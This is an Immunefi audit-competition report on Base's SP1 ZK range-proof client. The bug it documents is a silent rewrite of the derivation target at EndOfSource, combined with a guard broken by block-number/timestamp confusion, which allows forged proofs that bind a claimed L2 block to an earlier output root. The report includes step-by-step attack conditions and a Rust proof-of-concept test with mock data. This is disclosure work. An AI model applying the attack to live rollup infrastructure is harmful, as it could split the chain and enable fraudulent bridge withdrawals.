# 75369 bc medium zk range proof silently truncates derivation on endofsource and commits the original t r n permanent chain split when claimed l2 block number outruns the sequenced l1 bat&#x20;

**Submitted on Apr 28th 2026 at 18:37:08 UTC by @oxeix for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75369
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Unintended permanent chain split requiring hard fork (network partition requiring hard fork)

## Description

## Brief/Intro

`advance_to_target` (`crates/proof/succinct/utils/client/src/client.rs:95-110`) silently rewrites its `target` to the current safe head when the derivation pipeline returns `PipelineError::EndOfSource`, then returns `Ok((safe_head_at_N, R_N, …))`. The executor (`crates/proof/succinct/utils/client/src/witness/executor.rs:158-179`) only checks `output_root == claimed_l2_output_root` and returns `boot_clone` (line 198), so the **original** attacker-supplied `claimed_l2_block_number = T` flows into `BootInfoStruct` and onward into `AggregationOutputs`. The intended "fail loudly on Isthmus / Jovian / Azul" guard at line 106 is dead code: it passes a block number into `is_isthmus_active(timestamp: u64)` (`crates/common/genesis/src/rollup.rs:258-262`), and a Base block number (\~10^7) is two orders of magnitude smaller than Isthmus's Unix activation timestamp (\~10^9), so the comparison is `false` on every reachable Base block. The proof program therefore produces a valid SP1 proof of the false statement "block T's output root is R\_N" for any attacker-chosen `T > sequenced tip` and any publicly observable canonical root `R_N`.

## Vulnerability Details

End-to-end attack with no other dependencies:

{% stepper %}
{% step %}

### 1. Observe the canonical state

Attacker observes the canonical safe head `N` and its output root `R_N` (visible to anyone running a Base node).
{% endstep %}

{% step %}

### 2. Submit a witness

Submits a witness with:

* `claimed_l2_block_number = T`, where `T > N` (any value past the sequenced tip; `safe_head + 1` works).
* `claimed_l2_output_root = R_N`.
* `l1_head = real current L1 head`.
  {% endstep %}

{% step %}

### 3. Derivation silently truncates

Inside the SP1 program:

* `get_inputs_for_pipeline` accepts the inputs because `T ≥ agreed_safe_head.number`.
* `advance_to_target(target = T)` derives blocks. At block `N`, the pipeline exhausts L1 batches → `PipelineError::EndOfSource`.
* `target` is silently rewritten to `N` (`client.rs:101`). The Isthmus guard (`client.rs:106`) does nothing because of the timestamp/block-number type confusion, regardless of the active hardfork.
* Loop top reads `tip_cursor.number = N >= tb = N` → returns `Ok((safe_head_at_N, R_N, …))`.
  {% endstep %}

{% step %}

### 4. Executor accepts the root only

Executor: `R_N == boot.claimed_l2_output_root`. No block-number assertion. Returns `boot_clone` (the original boot, with `T` and `R_N`).
{% endstep %}

{% step %}

### 5. Boot info and aggregation preserve the attacker’s block number

`BootInfoStruct::new(...)` (`boot.rs:35-57`) copies `claimed_l2_block_number` and `claimed_l2_output_root` verbatim into `l2BlockNumber` and `l2PostRoot`. The range program commits this struct.

The aggregation program (`aggregation/src/main.rs:88-118`) propagates `last_boot_info.l2BlockNumber` and `last_boot_info.l2PostRoot` into `AggregationOutputs` unchanged — the chain check at lines 29-42 only enforces `prev.l2PostRoot == next.l2PreRoot`, never re-derives the relationship between `l2BlockNumber` and `l2PostRoot`. Final on-chain consumable: `keccak256(abi.encodePacked(AggregationOutputs))` with `endingL2SequenceNumber = T` and `l2PostRoot = R_N`.
{% endstep %}
{% endstepper %}

## Impact Details

Permanent chain split between L1-finalised state and canonical L2 state, anchored at every block `T` for which an attacker submits this poison proof

## References

<https://github.com/base/base/blob/main/crates/proof/succinct/utils/client/src/client.rsL95-110>

## Proof of Concept

```rust
    #[tokio::test]
    async fn poc_chain_split_at_commit_level_via_silent_target_rewrite() {
        use alloy_primitives::{Address as AlloyAddress, Bytes as AlloyBytes, keccak256};
        use alloy_sol_types::SolValue;

        use crate::{boot::BootInfoStruct, types::AggregationOutputs};

        const N: u64 = 100;
        const T: u64 = N + 5;
        let r_n =
            b256!("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
        let l1_head =
            b256!("dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd");
        let pre_state_root =
            b256!("9999999999999999999999999999999999999999999999999999999999999999");
        const PRE_BLOCK: u64 = N;

        let isthmus_unix: u64 = 1_735_689_600; // 2025-01-01 UTC
        let cfg = RollupConfig {
            hardforks: HardForkConfig {
                isthmus_time: Some(isthmus_unix),
                ..Default::default()
            },
            ..Default::default()
        };

        let cursor = make_cursor_at(N, r_n);
        let mut driver = Driver::new(
            Arc::clone(&cursor),
            MockExecutor,
            EndOfSourcePipeline { cfg: cfg.clone() },
        );

        let (safe_head, output_root, _intermediate_roots) =
            advance_to_target(&mut driver, &cfg, Some(T), 1).await.expect(
                "BUG: advance_to_target must return Ok despite EndOfSource (silent target rewrite). \
                 If this errors, the bug has been fixed and the PoC is no longer applicable.",
            );

 
        let claimed_l2_output_root = r_n; // attacker pre-set this to the publicly known R_N
        let claimed_l2_block_number = T; // attacker-chosen target
        assert_eq!(
            output_root, claimed_l2_output_root,
            "epilogue passes: attacker set claim = R_N, derivation reached R_N at block N, \
             output roots match"
        );
        assert_ne!(
            safe_head.block_info.number, claimed_l2_block_number,
            "BUG: derived block ({}) != claimed block ({}). The missing block-number \
             assertion lets this slip through.",
            safe_head.block_info.number, claimed_l2_block_number
        );

        let poisoned_boot_info = BootInfoStruct {
            l1Head: l1_head,
            l2PreRoot: pre_state_root,
            l2PostRoot: claimed_l2_output_root, // = R_N
            l2PreBlockNumber: PRE_BLOCK,
            l2BlockNumber: claimed_l2_block_number, // = T
            rollupConfigHash: B256::ZERO,
            intermediateRoots: AlloyBytes::new(),
        };

        let r_t_canonical =
            b256!("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
        let canonical_boot_info = BootInfoStruct {
            l1Head: l1_head,            // same L1 head
            l2PreRoot: pre_state_root,  // same agreed pre-state
            l2PostRoot: r_t_canonical,  // ≠ R_N
            l2PreBlockNumber: PRE_BLOCK,
            l2BlockNumber: claimed_l2_block_number, // same T
            rollupConfigHash: B256::ZERO,
            intermediateRoots: AlloyBytes::new(),
        };

        let poisoned_pv_hash = keccak256(poisoned_boot_info.abi_encode());
        let canonical_pv_hash = keccak256(canonical_boot_info.abi_encode());

        let make_agg_outputs = |boot: &BootInfoStruct| AggregationOutputs {
            proverAddress: AlloyAddress::ZERO,
            l1Head: boot.l1Head,
            l2PreRoot: boot.l2PreRoot,
            startingL2SequenceNumber: boot.l2PreBlockNumber,
            l2PostRoot: boot.l2PostRoot,
            endingL2SequenceNumber: boot.l2BlockNumber,
            intermediateRoots: boot.intermediateRoots.clone(),
            rollupConfigHash: boot.rollupConfigHash,
            imageHash: B256::ZERO,
        };
        let poisoned_l1_digest = keccak256(make_agg_outputs(&poisoned_boot_info).abi_encode_packed());
        let canonical_l1_digest =
            keccak256(make_agg_outputs(&canonical_boot_info).abi_encode_packed());

        println!(
            "[chain-split PoC #3] CHAIN-SPLIT EVIDENCE (SP1 public-values level)\n\
             === RANGE PROGRAM (BootInfoStruct → keccak256(abi.encode)) ===\n  \
               poisoned : l2BlockNumber={p_t} l2PostRoot={p_root}\n    \
                 pv_hash = {poisoned_pv_hash}\n  \
               canonical: l2BlockNumber={c_t} l2PostRoot={c_root}\n    \
                 pv_hash = {canonical_pv_hash}\n\
             === AGGREGATION PROGRAM (keccak256(abi.encodePacked(AggregationOutputs))) ===\n  \
               poisoned  L1 digest = {poisoned_l1_digest}\n  \
               canonical L1 digest = {canonical_l1_digest}\n\
             === SUMMARY ===\n  \
               Same L2 block number (T = {c_t}), two different L2PostRoots,\n  \
               two different SP1 public-values digests. The poisoned digest is what the\n  \
               L1 dispute game would finalize once the attacker submits this proof first.\n  \
               Honest Base fullnodes following the STF produce the canonical digest at T.\n  \
               Bridge withdrawals validated against L1's outputs[T]=R_N pass with state\n  \
               proofs against state-at-N — including any UTXO/balance that existed at N\n  \
               but was spent / cancelled / re-orged in canonical post-N history.",
            p_t = poisoned_boot_info.l2BlockNumber,
            p_root = poisoned_boot_info.l2PostRoot,
            c_t = canonical_boot_info.l2BlockNumber,
            c_root = canonical_boot_info.l2PostRoot,
        );

        assert_ne!(
            poisoned_pv_hash, canonical_pv_hash,
            "[chain-split PoC #3] range-program public-values digests must differ for the \
             same block T (different l2PostRoot)"
        );
        assert_ne!(
            poisoned_l1_digest, canonical_l1_digest,
            "[chain-split PoC #3] aggregation L1 digests must differ for the same block T \
             - that IS the chain split. Two valid SP1 commitments for endingL2SequenceNumber={T} \
             with different l2PostRoots: the L1 dispute game finalizes the poisoned one, \
             honest fullnodes follow the canonical one, the chain is split."
        );
    }
```

Logs:

```rust
endingL2SequenceNumber = 105
poisoned  l2PostRoot=0xaaaa…aaaa  L1 digest = 0x80985ebf…1e3f45c1
canonical l2PostRoot=0xbbbb…bbbb  L1 digest = 0xe661a0f7…80bc8401
```
